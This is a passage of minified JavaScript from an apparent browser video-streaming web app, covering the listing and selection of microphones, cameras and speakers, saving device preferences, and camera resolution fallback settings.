window&&!1===window.isSecureContext?warnUser("Error listing the media devices.\n\nThe website may have assets loaded in an insecure context."):warnUser("An unknown error occured while trying to list the media devices."))}}))}function requestOutputAudioStream(){try{return warnlog("navigator.mediaDevices.getUserMedia starting..."),navigator.mediaDevices.getUserMedia({audio:!0,video:!1}).then((function(stream1){return log("get media sources; request audio stream"),enumerateDevices().then((function(deviceInfos){stream1.getTracks().forEach((function(track){track.stop()}));const audioOutputSelect=getById("outputSourceScreenshare");audioOutputSelect.remove(0),audioOutputSelect.removeAttribute("onclick");for(let i=0;i!==deviceInfos.length;++i){const deviceInfo=deviceInfos[i];if(null==deviceInfo)continue;if(document.createElement("option").value=deviceInfo.deviceId,"audiooutput"===deviceInfo.kind){const option=document.createElement("option");0===audioOutputSelect.length?option.dataset.default=!0:option.dataset.default=!1,option.value=deviceInfo.deviceId||"default",option.value==session.sink&&(option.selected="true"),option.text=deviceInfo.label||`Speaker ${audioOutputSelect.length+1}`,audioOutputSelect.appendChild(option)}else log("Some other kind of source/device: ",deviceInfo)}}))}))}catch(e){session.cleanOutput||(window.isSecureContext?warnUser("An error has occured when trying to access the default audio device. The reason is not known."):warnUser(iOS||iPad?"iOS version 13.4 and up is generally recommended; older than iOS 11 is not supported.":"Error accessing the default audio device.\n\nThe website may be loaded in an insecure context.\n\nPlease see: https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia"))}}async function requestAudioStream(){try{return warnlog("navigator.mediaDevices.getUserMedia starting..."),await navigator.mediaDevices.getUserMedia({audio:!0,video:!1}).then((async function(stream1){return log("get media sources; request audio stream"),await enumerateDevices().then((function async(deviceInfos){stream1.getTracks().forEach((function(track){track.stop()})),log("updating audio");const audioInputSelect=getById("audioSourceScreenshare");audioInputSelect.remove(1),audioInputSelect.removeAttribute("onchange");for(let i=0;i!==deviceInfos.length;++i){const deviceInfo=deviceInfos[i];if(null==deviceInfo)continue;const option=document.createElement("option");option.value=deviceInfo.deviceId,"audioinput"===deviceInfo.kind?(option.text=deviceInfo.label||`Microphone ${audioInputSelect.length+1}`,audioInputSelect.appendChild(option)):log("Some other kind of source/device: ",deviceInfo)}if(audioInputSelect.style.minHeight=1.15*(audioInputSelect.childElementCount+1)*16+"px",audioInputSelect.style.minWidth="342px",session.audioDevice&&"object"==typeof session.audioDevice&&session.audioDevice.length)for(let i=0;i!==audioInputSelect.length;++i){let deviceInfo=audioInputSelect[i];(session.audioDevice.includes(deviceInfo.value)||deviceInfo.innerText.replace(/[\W]+/g,"_").toLowerCase().startsWith(session.audioDevice)||deviceInfo.innerText.replace(/[\W]+/g,"_").toLowerCase().includes(session.audioDevice))&&(deviceInfo.selected=!0)}}))}))}catch(e){session.cleanOutput||(window.isSecureContext?warnUser("An error has occured when trying to access the default audio device. The reason is not known."):warnUser(iOS||iPad?"iOS version 13.4 and up is generally recommended; older than iOS 11 is not supported.":"Error accessing the default audio device.\n\nThe website may be loaded in an insecure context.\n\nPlease see: https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia"))}}function saveSettings(){if(session.store)try{var tmp={};SelectedAudioInputDevices&&(tmp.SelectedAudioInputDevices=SelectedAudioInputDevices.filter((n=>n))),session.sink&&"default"!=session.sink?tmp.SelectedAudioOutputDevices=session.sink:!session.sink&&SelectedAudioOutputDevices&&"default"!=SelectedAudioOutputDevices&&(tmp.SelectedAudioOutputDevices=SelectedAudioOutputDevices),tmp.SelectedVideoInputDevices=SelectedVideoInputDevices,setStorage("session_store",JSON.stringify(tmp)),log("Saving settings")}catch(e){errorlog(e)}}function loadSettings(){if(session.store)try{session.store=getStorage("session_store"),session.store?session.store=JSON.parse(session.store):session.store={},session.store&&session.store.SelectedAudioOutputDevices&&("string"==typeof session.store.SelectedAudioOutputDevices?SelectedAudioOutputDevices=session.store.SelectedAudioOutputDevices:"object"==typeof session.store.SelectedAudioOutputDevices&&session.store.SelectedAudioOutputDevices.length&&(SelectedAudioOutputDevices=session.store.SelectedAudioOutputDevices[0])),session.store&&session.store.SelectedAudioInputDevices&&(session.store.SelectedAudioInputDevices=session.store.SelectedAudioInputDevices.filter((n=>n)),SelectedAudioInputDevices=session.store.SelectedAudioInputDevices),session.store&&session.store.SelectedVideoInputDevices&&(SelectedVideoInputDevices=session.store.SelectedVideoInputDevices)}catch(e){}}function gotDevices(deviceInfos,miconly=!1){log("got devices!1"),log(deviceInfos);try{Firefox&&!FirefoxEnumerated&&session.streamSrc&&session.streamSrc.getTracks().length&&(FirefoxEnumerated=!0),(option=document.createElement("input")).type="checkbox",option.value="ZZZ",option.name="multiselect1",option.id="multiselect1",option.style.display="none",option.checked=!0;var label=document.createElement("label");label.for=option.name,label.innerHTML='<span data-translate="no-audio"> No Audio</span>';var listele=document.createElement("li");listele.appendChild(option),listele.appendChild(label);const audioInputSelect=document.getElementById("audioSource")||document.getElementById("audioSource3");audioInputSelect.innerHTML="",audioInputSelect.appendChild(listele);const audioOutputSelect=document.getElementById("outputSource")||document.getElementById("outputSource3");audioOutputSelect.innerHTML="",option.onchange=function(event){if(getById("multiselect1").checked)for(var list=audioInputSelect.querySelectorAll("li>input"),i=0;i<list.length;i++)"multiselect1"!==list[i].id&&(list[i].checked=!1);else getById("multiselect1").checked=!0;SelectedAudioInputDevices=[event.currentTarget.value],saveSettings()};const multiselectTrigger=document.getElementById("multiselect-trigger")||document.getElementById("multiselect-trigger3");multiselectTrigger.dataset.state="0",multiselectTrigger.classList.add("closed"),multiselectTrigger.classList.remove("open"),getById("chevarrow1").classList.add("bottom");const videoSelect=document.getElementById("videoSourceSelect")||document.getElementById("videoSource3"),selectors=[videoSelect],values=selectors.map((select=>select.value));selectors.forEach((select=>{for(;select.firstChild;)select.removeChild(select.firstChild)}));var tmp=[];for(let i=0;i!==deviceInfos.length;++i)"videoinput"===(deviceInfo=deviceInfos[i]).kind&&(deviceInfo.label.toLowerCase().startsWith("ndi")||deviceInfo.label.toLowerCase().startsWith("newtek"))||tmp.push(deviceInfo);for(let i=0;i!==deviceInfos.length;++i)"videoinput"===(deviceInfo=deviceInfos[i]).kind&&(deviceInfo.label.toLowerCase().startsWith("ndi")||deviceInfo.label.toLowerCase().startsWith("newtek"))&&(tmp.push(deviceInfo),log("V DEVICE FOUND = "+deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase()));if(deviceInfos=tmp,"object"==typeof session.audioDevice){var matched=[],notmatched=[];for(let i=0;i!==deviceInfos.length;++i)if("audioinput"===deviceInfos[i].kind){if(session.audioDevice.includes(deviceInfos[i].deviceId))matched.push(deviceInfos[i]);else for(var j=0;j<session.audioDevice.length;j++)if(deviceInfos[i].label.replace(/[\W]+/g,"_").toLowerCase().includes(session.audioDevice[j])){matched.push(deviceInfos[i]),log("A DEVICE FOUND = "+deviceInfos[i].label);break}}else notmatched.push(deviceInfos[i]);deviceInfos=matched.concat(notmatched)}else if(session.store&&session.store.SelectedAudioInputDevices){matched=[];var notmatch=[];for(let i=0;i<deviceInfos.length;++i)deviceInfo=deviceInfos[i],session.store.SelectedAudioInputDevices.includes(deviceInfo.deviceId)?(matched.push(deviceInfo),log("EXACT A DEVICE FOUND -- from saved session")):notmatch.push(deviceInfo);deviceInfos=matched.concat(notmatch)}if(session.sink||SelectedAudioOutputDevices){matched=[],notmatch=[];for(let i=0;i!==deviceInfos.length;++i)"audiooutput"===(deviceInfo=deviceInfos[i]).kind&&deviceInfo.deviceId===session.sink?matched.push(deviceInfo):session.sink||"audiooutput"!==deviceInfo.kind||deviceInfo.deviceId!==SelectedAudioOutputDevices?notmatch.push(deviceInfo):matched.push(deviceInfo);deviceInfos=matched.concat(notmatch)}if(session.videoDevice&&1!==session.videoDevice){tmp=[];var tmp2=[],tmp3=[];for(let i=0;i!==deviceInfos.length;++i)"videoinput"===(deviceInfo=deviceInfos[i]).kind&&deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().startsWith(session.videoDevice)?(tmp.push(deviceInfo),log("Starts With V DEVICE FOUND")):deviceInfo.deviceId===session.videoDevice?(tmp.push(deviceInfo),log("EXACT V DEVICE FOUND")):"videoinput"===deviceInfo.kind&&deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes(session.videoDevice)?(tmp2.push(deviceInfo),log("Includes With V DEVICE FOUND")):tmp3.push(deviceInfo);tmp2.length&&(tmp=tmp.concat(tmp2)),tmp3.length&&(tmp=tmp.concat(tmp3)),deviceInfos=tmp,log("VDECICE:"+session.videoDevice),log(deviceInfos)}else if(!1===session.videoDevice&&session.facingMode){tmp=[];if("environment"==session.facingMode)for(let i=0;i!==deviceInfos.length;++i)("videoinput"===(deviceInfo=deviceInfos[i]).kind&&deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes("back")||"videoinput"===deviceInfo.kind&&deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes("rear"))&&(tmp.push(deviceInfo),log("V DEVICE FOUND = "+deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase()));else if("user"==session.facingMode)for(let i=0;i!==deviceInfos.length;++i)"videoinput"===(deviceInfo=deviceInfos[i]).kind&&deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes("front")&&(tmp.push(deviceInfo),log("V DEVICE FOUND = "+deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase()));for(let i=0;i!==deviceInfos.length;++i)"videoinput"===(deviceInfo=deviceInfos[i]).kind&&deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes(session.videoDevice)||deviceInfo.deviceId!==session.videoDevice&&tmp.push(deviceInfo);deviceInfos=tmp,log("VDECICE:"+session.videoDevice),log(deviceInfos)}else if(session.store&&session.store.SelectedVideoInputDevices&&!1===session.videoDevice){matched=[],notmatch=[];for(let i=0;i!==deviceInfos.length;++i)deviceInfo=deviceInfos[i],session.store.SelectedVideoInputDevices.includes(deviceInfo.deviceId)?(matched.push(deviceInfo),log("EXACT V DEVICE FOUND -- from saved session")):notmatch.push(deviceInfo);deviceInfos=matched.concat(notmatch),delete session.store.SelectedVideoInputDevices}if(session.audioDevice&&"object"==typeof session.audioDevice)var adMatch=[...session.audioDevice];else if(session.store&&session.store.SelectedAudioInputDevices&&session.store.SelectedAudioInputDevices.length)adMatch=[...session.store.SelectedAudioInputDevices];else adMatch=!1;session.store&&session.store.SelectedAudioInputDevices&&delete session.store.SelectedAudioInputDevices;var option,counter=1;for(let i=0;i!==deviceInfos.length;++i){var deviceInfo;if(null!=(deviceInfo=deviceInfos[i]))if("audioinput"===deviceInfo.kind){if((option=document.createElement("input")).type="checkbox",counter++,(listele=document.createElement("li")).style.display="none","object"==typeof adMatch)for(j=0;j<adMatch.length;j++)if(adMatch[j]){if(adMatch[j]==deviceInfo.deviceId){option.checked=!0,listele.style.display="block",option.style.display="none",getById("multiselect1").checked=!1;try{getById("multiselect1").parentNode.style.display="none"}catch(e){}adMatch[j]=null;break}if(deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes(adMatch[j])){option.checked=!0,listele.style.display="block",option.style.display="none",getById("multiselect1").checked=!1;try{getById("multiselect1").parentNode.style.display="none"}catch(e){}adMatch[j]=null;break}}else;if("object"!=typeof adMatch&&2==counter){option.checked=!0,listele.style.display="block",option.style.display="none",getById("multiselect1").checked=!1;try{getById("multiselect1").parentNode.style.display="none"}catch(e){}}option.value=deviceInfo.deviceId||"default",option.name="multiselect"+counter,option.id="multiselect"+counter,option.label=deviceInfo.label,(label=document.createElement("label")).for=option.name,label.innerHTML=" "+(deviceInfo.label||"microphone "+((audioInputSelect.length||0)+1)),listele.appendChild(option),listele.appendChild(label),audioInputSelect.appendChild(listele),option.onchange=function(event){if(getById("multiselect1").checked=!1,log("UNCHECKED"),CtrlPressed){if(event.currentTarget.checked)SelectedAudioInputDevices?SelectedAudioInputDevices.includes(event.currentTarget.value)||SelectedAudioInputDevices.push(event.currentTarget.value):SelectedAudioInputDevices=[event.currentTarget.value];else if(event.currentTarget.value)for(;SelectedAudioInputDevices.includes(event.currentTarget.value);)SelectedAudioInputDevices.splice(SelectedAudioInputDevices.indexOf(event.currentTarget.value),1)}else SelectedAudioInputDevices=[],audioInputSelect.querySelectorAll("input[type='checkbox']").forEach((function(item){event.currentTarget.id!==item.id?item.checked=!1:(item.checked=!0,SelectedAudioInputDevices=[event.currentTarget.value])}));!session.mobile||iOS||iPad||"USB audio"!==event.currentTarget.label||session.cleanOutput||warnUser("Notice: USB audio devices may not work on all mobile devices.\n\nConsider using FireFox mobile instead, as it tends to work with USB audio devices more often."),saveSettings()},deviceInfo.label.includes("Yeti ")&&(session.cleanOutput||(miniTranslate(getById("audioTipContext1"),"blue-yeti-tip"),getById("audioTip1").classList.remove("hidden")))}else"videoinput"===deviceInfo.kind?((option=document.createElement("option")).value=deviceInfo.deviceId||"default",option.text=deviceInfo.label||`camera ${videoSelect.length+1}`,videoSelect.appendChild(option)):"audiooutput"===deviceInfo.kind?(option=document.createElement("option"),0===audioOutputSelect.length?option.dataset.default=!0:option.dataset.default=!1,option.value=deviceInfo.deviceId||"default",(option.value==session.sink||!session.sink&&SelectedAudioOutputDevices&&SelectedAudioOutputDevices==option.value)&&(option.selected="true"),option.text=deviceInfo.label||`Speaker ${audioOutputSelect.length+1}`,audioOutputSelect.appendChild(option)):log("Some other kind of source/device: ",deviceInfo)}if(Firefox&&!session.mobile)(option=document.createElement("option")).value="others",option.text="Show more options",audioOutputSelect.appendChild(option);0==audioOutputSelect.childNodes.length&&((option=document.createElement("option")).value="default",option.text="System Default",audioOutputSelect.appendChild(option)),(option=document.createElement("option")).text="Disable Video",option.value="ZZZ",videoSelect.appendChild(option),miconly&&(option.selected="true"),selectors.forEach(((select,selectorIndex)=>{Array.prototype.slice.call(select.childNodes).some((n=>n.value===values[selectorIndex]))&&(select.value=values[selectorIndex])}))}catch(e){errorlog(e)}}function gotDevicesNew(deviceInfos,miconly=!1){try{log("got devices!1"),log(deviceInfos),Firefox&&!FirefoxEnumerated&&session.streamSrc&&session.streamSrc.getTracks().length&&(FirefoxEnumerated=!0);var audioInputs=[],audioOutputs=[],videoInputs=[];if(deviceInfos.forEach((function(deviceInfo){"audioinput"===deviceInfo.kind?audioInputs.push(deviceInfo):"audiooutput"===deviceInfo.kind?audioOutputs.push(deviceInfo):"videoinput"===deviceInfo.kind&&videoInputs.push(deviceInfo)})),"object"==typeof session.audioDevice){var matched=[];audioInputs.forEach((deviceInfo=>{if(session.audioDevice.includes(deviceInfo.deviceId))matched.push(deviceInfo);else for(var j=0;j<session.audioDevice.length;j++)if(deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes(session.audioDevice[j])){matched.push(deviceInfo),log("A DEVICE FOUND = "+deviceInfo.label);break}})),audioInputs=matched}else if(session.store&&session.store.SelectedAudioInputDevices){matched=[];var notmatch=[];audioInputs.forEach((deviceInfo=>{session.store.SelectedAudioInputDevices.includes(deviceInfo.deviceId)?(matched.push(deviceInfo),log("EXACT A DEVICE FOUND -- from saved session")):notmatch.push(deviceInfo)})),audioInputs=matched.concat(notmatch)}document.getElementById("audioMenuChev")&&(document.getElementById("audioMenuChev").onclick=function(){getById("chevarrow1").classList.toggle("bottom"),getById("audioSource").classList.toggle("expanded"),event.preventDefault(),event.stopPropagation(),getById("audioSource").classList.contains("expanded")?getById("audioSource").size=getById("audioSource").options.length:getById("audioSource").size=getById("audioSource").selectedOptions.length});var audioInputSelect=document.getElementById("audioSource")||document.getElementById("audioSource3");if(session.mobile?(audioInputSelect.classList.add("expanded"),getById("chevarrow1").classList.remove("bottom"),getById("chevarrow1").classList.add("hidden"),audioInputSelect.onchange=function(){return log("change: "+this.selectedOptions.length),event.preventDefault(),event.stopPropagation(),0===this.selectedOptions.length?this.options[0].selected=!0:this.selectedOptions.length>1&&this.options[0].selected&&(this.options[0].selected=!1),SelectedAudioInputDevices=Array.from(audioInputSelect.selectedOptions).map((option=>option.value)),saveSettings(),document.getElementById("gowebcam")&&(document.getElementById("gowebcam").disabled=!0,document.getElementById("gowebcam").dataset.audioready="false",document.getElementById("gowebcam").style.fontWeight="normal",document.getElementById("gowebcam").innerHTML="Waiting for mic to load",miniTranslate(document.getElementById("gowebcam"),"waiting-for-mic-to-load")),activatedPreview=!1,grabAudio(),!1}):(audioInputSelect.multiple=!0,audioInputSelect.onfocus=function(){this.classList.add("expanded"),getById("chevarrow1").classList.remove("bottom"),getById("audioSource").size=getById("audioSource").options.length},audioInputSelect.onblur=function(event){CtrlPressed||(this.classList.remove("expanded"),getById("chevarrow1").classList.add("bottom"),getById("audioSource").size=getById("audioSource").selectedOptions.length)},audioInputSelect.onmousedown=function(event){console.log("mouse down"),this.classList.contains("expanded")||(event.preventDefault(),this.classList.add("expanded"),getById("chevarrow1").classList.remove("bottom"),getById("audioSource").size=getById("audioSource").options.length,audioInputSelect.init=1,console.log("utSelect.init true"))},audioInputSelect.onmouseup=function(event){console.log("mouse up"),CtrlPressed||audioInputSelect.init?(this.focus(),event.preventDefault(),event.stopPropagation()):this.blur()},audioInputSelect.onclick=function(event){if(log("click"),event.ctrlKey)this.classList.add("expanded"),getById("chevarrow1").classList.remove("bottom"),getById("audioSource").size=getById("audioSource").options.length;else{const clickedOption=event.target;if(audioInputSelect.CtrlPressed=!1,"SELECT"==clickedOption.tagName);else{const isSelected=clickedOption.selected;var morethan1=this.selectedOptions.length;morethan1>1?(Array.from(this.options).forEach((opt=>opt.selected=!1)),clickedOption.selected=isSelected):morethan1||(clickedOption.selected=isSelected)}}event.preventDefault(),event.stopPropagation(),audioInputSelect.init||(console.log("utSelect.init iS : "+audioInputSelect.init),event1=new Event("change",{bubbles:!0,cancelable:!0}),event.target.dispatchEvent(event1)),audioInputSelect.init=null,console.log("utSelect.init false")},audioInputSelect.onchange=function(){return log("change: "+this.selectedOptions.length),event.preventDefault(),event.stopPropagation(),0===this.selectedOptions.length?this.options[0].selected=!0:this.selectedOptions.length>1&&this.options[0].selected&&(this.options[0].selected=!1),SelectedAudioInputDevices=Array.from(audioInputSelect.selectedOptions).map((option=>option.value)),saveSettings(),document.getElementById("gowebcam")&&(document.getElementById("gowebcam").disabled=!0,document.getElementById("gowebcam").dataset.audioready="false",document.getElementById("gowebcam").style.fontWeight="normal",document.getElementById("gowebcam").innerHTML="Waiting for mic to load",miniTranslate(document.getElementById("gowebcam"),"waiting-for-mic-to-load")),CtrlPressed||(this.classList.remove("expanded"),getById("chevarrow1").classList.add("bottom"),getById("audioSource").size=getById("audioSource").selectedOptions.length,audioInputSelect.CtrlPressed=!1),activatedPreview=!1,grabAudio(),!1}),session.audioDevice&&"object"==typeof session.audioDevice)var adMatch=[...session.audioDevice];else if(session.store&&session.store.SelectedAudioInputDevices&&session.store.SelectedAudioInputDevices.length)adMatch=[...session.store.SelectedAudioInputDevices];else adMatch=[...SelectedAudioInputDevices];if(session.store&&session.store.SelectedAudioInputDevices&&delete session.store.SelectedAudioInputDevices,audioInputSelect&&audioInputSelect.options&&!audioInputSelect.options.length)(option=document.createElement("option")).innerHTML='<span data-translate="no-audio"> No Audio</span>',option.value="ZZZ",option.selected=!0,option.id="multiselect1",audioInputSelect.appendChild(option),option.onmouseover=function(){!MousePressed||CtrlPressed||audioInputSelect.init||audioInputSelect.CtrlPressed||(console.log("MousePressed 2:"+MousePressed),2==audioInputSelect.init?audioInputSelect.init=!1:audioInputSelect.init&&(audioInputSelect.init=2)),audioInputSelect.CtrlPressed=audioInputSelect.CtrlPressed||CtrlPressed};if(audioInputs.forEach((function(deviceInfo){var option=null;for(let i=0;i<audioInputSelect.options.length;i++)if(audioInputSelect.options[i].value===deviceInfo.deviceId){option=audioInputSelect.options[i];break}option||((option=document.createElement("option")).value=deviceInfo.deviceId,option.textContent=deviceInfo.label||"microphone "+counter++,audioInputSelect.appendChild(option),option.onmouseover=function(){!MousePressed||CtrlPressed||audioInputSelect.CtrlPressed||(console.log("MousePressed 1:"+MousePressed),2==audioInputSelect.init?audioInputSelect.init=!1:audioInputSelect.init&&(audioInputSelect.init=2),console.log("utSelect.init false")),audioInputSelect.CtrlPressed=audioInputSelect.CtrlPressed||CtrlPressed});for(var j=0;j<adMatch.length;j++)if(adMatch[j]){if(adMatch[j]==deviceInfo.deviceId){option.selected=!0,getById("multiselect1").selected=!1,adMatch[j]=null;break}if(deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes(adMatch[j])){option.selected=!0,getById("multiselect1").selected=!1,adMatch[j]=null;break}}else;})),0===audioInputSelect.selectedOptions.length&&(audioInputSelect.options[0].selected=!0),getById("audioSource").classList.contains("expanded")?getById("audioSource").size=getById("audioSource").options.length:getById("audioSource").size=getById("audioSource").selectedOptions.length,session.sink||SelectedAudioOutputDevices){matched=[],notmatch=[];audioOutputs.forEach((deviceInfo=>{"audiooutput"===deviceInfo.kind&&deviceInfo.deviceId===session.sink?matched.push(deviceInfo):session.sink||"audiooutput"!==deviceInfo.kind||deviceInfo.deviceId!==SelectedAudioOutputDevices?notmatch.push(deviceInfo):matched.push(deviceInfo)})),audioOutputs=matched.concat(notmatch)}const audioOutputSelect=document.getElementById("outputSource")||document.getElementById("outputSource3");if(audioOutputSelect.innerHTML="",audioOutputs.forEach((deviceInfo=>{var option=document.createElement("option");0===audioOutputSelect.length?option.dataset.default=!0:option.dataset.default=!1,option.value=deviceInfo.deviceId||"default",(option.value==session.sink||!session.sink&&SelectedAudioOutputDevices&&SelectedAudioOutputDevices==option.value)&&(option.selected="true"),option.text=deviceInfo.label||`Speaker ${audioOutputSelect.length+1}`,audioOutputSelect.appendChild(option)})),Firefox&&!session.mobile)(option=document.createElement("option")).value="others",option.text="Show more options",audioOutputSelect.appendChild(option);0==audioOutputSelect.childNodes.length&&((option=document.createElement("option")).value="default",option.text="System Default",audioOutputSelect.appendChild(option));const videoSelect=document.getElementById("videoSourceSelect")||document.getElementById("videoSource3"),selectors=[videoSelect],values=selectors.map((select=>select.value));if(selectors.forEach((select=>{for(;select.firstChild;)select.removeChild(select.firstChild)})),videoInputs.sort(((a,b)=>{const aLabel=a.label.toLowerCase(),bLabel=b.label.toLowerCase(),aIsNdiOrNewtek=aLabel.startsWith("ndi")||aLabel.startsWith("newtek"),bIsNdiOrNewtek=bLabel.startsWith("ndi")||bLabel.startsWith("newtek");return aIsNdiOrNewtek&&!bIsNdiOrNewtek?1:!aIsNdiOrNewtek&&bIsNdiOrNewtek?-1:0})),session.videoDevice&&1!==session.videoDevice){var tmp=[],tmp2=[],tmp3=[];videoInputs.forEach((deviceInfo=>{"videoinput"===deviceInfo.kind&&deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().startsWith(session.videoDevice)?(tmp.push(deviceInfo),log("Starts With V DEVICE FOUND")):deviceInfo.deviceId===session.videoDevice?(tmp.push(deviceInfo),log("EXACT V DEVICE FOUND")):"videoinput"===deviceInfo.kind&&deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes(session.videoDevice)?(tmp2.push(deviceInfo),log("Includes With V DEVICE FOUND")):tmp3.push(deviceInfo)})),tmp2.length&&(tmp=tmp.concat(tmp2)),tmp3.length&&(tmp=tmp.concat(tmp3)),videoInputs=tmp,log("VDECICE:"+session.videoDevice),log(videoInputs)}else if(!1===session.videoDevice&&session.facingMode){tmp=[];"environment"==session.facingMode?videoInputs.forEach((deviceInfo=>{(deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes("back")||"videoinput"===deviceInfo.kind&&deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes("rear"))&&(tmp.push(deviceInfo),log("V DEVICE FOUND = "+deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase()))})):"user"==session.facingMode&&videoInputs.forEach((deviceInfo=>{deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes("front")&&(tmp.push(deviceInfo),log("V DEVICE FOUND = "+deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase()))})),videoInputs.forEach((deviceInfo=>{deviceInfo.label.replace(/[\W]+/g,"_").toLowerCase().includes(session.videoDevice)||deviceInfo.deviceId!==session.videoDevice&&tmp.push(deviceInfo)})),videoInputs=tmp,log("VDECICE:"+session.videoDevice),log(videoInputs)}else if(session.store&&session.store.SelectedVideoInputDevices&&!1===session.videoDevice){matched=[],notmatch=[];videoInputs.forEach((deviceInfo=>{session.store.SelectedVideoInputDevices.includes(deviceInfo.deviceId)?(matched.push(deviceInfo),log("EXACT V DEVICE FOUND -- from saved session")):notmatch.push(deviceInfo)})),videoInputs=matched.concat(notmatch),delete session.store.SelectedVideoInputDevices}var option;videoInputs.forEach((deviceInfo=>{if(null!=deviceInfo){var option=document.createElement("option");option.value=deviceInfo.deviceId||"default",option.text=deviceInfo.label||`camera ${videoSelect.length+1}`,videoSelect.appendChild(option)}})),(option=document.createElement("option")).text="Disable Video",option.value="ZZZ",videoSelect.appendChild(option),miconly&&(option.selected="true"),selectors.forEach(((select,selectorIndex)=>{Array.prototype.slice.call(select.childNodes).some((n=>n.value===values[selectorIndex]))&&(select.value=values[selectorIndex])}))}catch(e){errorlog(e)}}function getUserMediaVideoParams(resolutionFallbackLevel,isSafariBrowser){switch(resolutionFallbackLevel){case-1:return{};case 0:return isSafariBrowser?{width:{min:360,ideal:1920,max:1920},height:{min:360,ideal:1080,max:1080}}:Firefox?{width:{ideal:1920},height:{ideal:1080}}:{width:{min:720,ideal:1920,max:1920},height:{min:720,ideal:1080,max:1920}};case 1:return isSafariBrowser?{width:{min:360,ideal:1280,max:1280},height:{min:360,ideal:720,max:720}}:Firefox?{width:{ideal:1280},height:{ideal:720}}:{width:{min:720,ideal:1280,max:1280},height:{min:720,ideal:720,max:1280}};case 2:return isSafariBrowser?{width:{min:640},height:{min:360}}:Firefox?{width:{ideal:640},height:{ideal:360}}:{width:{min:240,ideal:640,max:1280},height:{min:240,ideal:360,max:1280}};case 3:return{width:{min:360,ideal:1280,max:1440}};case 4:return isSafariBrowser?{height:{min:360,ideal:720,max:960}}:{height:{ideal:720,max:960}};case 5:return isSafariBrowser?{width:{min:360,ideal:640,max:1440},height:{min:360,ideal:360,max:720}}:{width:{ideal:640,max:1920},height:{ideal:360,max:1920}};case 6:return isSafariBrowser?{}:{width:{min:360,ideal:640,max:3840},height:{min:360,ideal:360,max:2160}};case 7:return{width:{min:360,ideal:640},height:{min:360,ideal:360}};case 8:return{width:{min:360},height:{min:360},frameRate:10};case 9:return{frameRate:0};default:return{}}}function addScreenDevices(device){if("audio"==device.kind){const audioInputSelect=getById("audioSource3"),listele=document.createElement("li");listele.style.display="block";const option=document.createElement("input");option.type="checkbox",option.checked=!0,0==getById("multiselect-trigger3").dataset.state&&(option.style.display="none"),option.value=device.id,option.name=device.label,option.dataset.type="screen",option.label=device.label;const label=document.createElement("label");label.for=option.name,label.innerHTML=" "+device.label,listele.appendChild(option),listele.appendChild(label),option.onchange=function(event){return log("change 4644"),CtrlPressed||document.querySelectorAll("#audioSource3 input[type='checkbox']").forEach((function(item){if(item.value)if(event.currentTarget.value!==item.value){for(item.checked=!1,"screen"==item.dataset.type&&item.parentElement.parentElement.removeChild(item.parentElement);SelectedAudioInputDevices.indexOf(item.value)>-1;)SelectedAudioInputDevices.splice(SelectedAudioInputDevices.indexOf(item.value),1);activatedPreview=!1,grabAudio("#audioSource3")}else-1==SelectedAudioInputDevices.indexOf(item.value)&&(SelectedAudioInputDevices.length&&SelectedAudioInputDevices.includes("ZZZ")&&(SelectedAudioInputDevices=[]),SelectedAudioInputDevices.push(item.value)),item.checked=!0,activatedPreview=!1,grabAudio("#audioSource3",item.value)})),saveSettings(),event.stopPropagation(),!1},audioInputSelect.appendChild(listele),getById("audioSourceNoAudio2").checked=!1}else if("video"==device.kind){const videoSelect=getById("videoSource3"),option=document.createElement("option");option.value=device.id,option.text=device.label,option.selected="true",option.label=device.label,videoSelect.appendChild(option)}}var gotDevices2AlreadyRan=!1;function gotDevices2(deviceInfos){gotDevices2AlreadyRan=!0,log("got devices!2"),log(deviceInfos),getById("multiselect-trigger3").dataset.state="0",getById("multiselect-trigger3").classList.add("closed"),getById("multiselect-trigger3").classList.remove("open"),getById("chevarrow2").classList.add("bottom"),session.streamSrc||checkBasicStreamsExist();var knownTrack=!1;try{const audioInputSelect=getById("audioSource3"),videoSelect=getById("videoSource3"),audioOutputSelect=getById("outputSource3"),selectors=[videoSelect];[audioInputSelect].forEach((select=>{for(;select.firstChild;)select.removeChild(select.firstChild)}));selectors.map((select=>select.value));selectors.forEach((select=>{for(;select.firstChild;)select.removeChild(select.firstChild)})),[audioOutputSelect].forEach((select=>{for(;select.firstChild;)select.removeChild(select.firstChild)}));var counter=0;for(let i=0;i!==deviceInfos.length;++i){const deviceInfo=deviceInfos[i];if(null!=deviceInfo)if("audioinput"===deviceInfo.kind)(option=document.createElement("input")).type="checkbox",counter++,(listele=document.createElement("li")).style.display="none",session.streamSrc.getAudioTracks().forEach((function(track){deviceInfo.label==track.label&&(option.checked=!0,listele.style.display="inherit")})),option.style.display="none",option.value=deviceInfo.deviceId||"default",option.name="multiselecta"+counter,option.id="multiselecta"+counter,option.dataset.label=deviceInfo.label||"microphone "+((audioInputSelect.length||0)+1),(label=document.createElement("label")).for=option.name,label.innerHTML=" "+(deviceInfo.label||"microphone "+((audioInputSelect.length||0)+1)),listele.appendChild(option),listele.appendChild(label),audioInputSelect.appendChild(listele),option.onchange=function(event){log("change 4768"),CtrlPressed?(-1==SelectedAudioInputDevices.indexOf(event.currentTarget.value)&&(SelectedAudioInputDevices.length&&SelectedAudioInputDevices.includes("ZZZ")&&(SelectedAudioInputDevices=[]),SelectedAudioInputDevices.push(event.currentTarget.value)),getById("audioSourceNoAudio2").checked=!1):document.querySelectorAll("#audioSource3 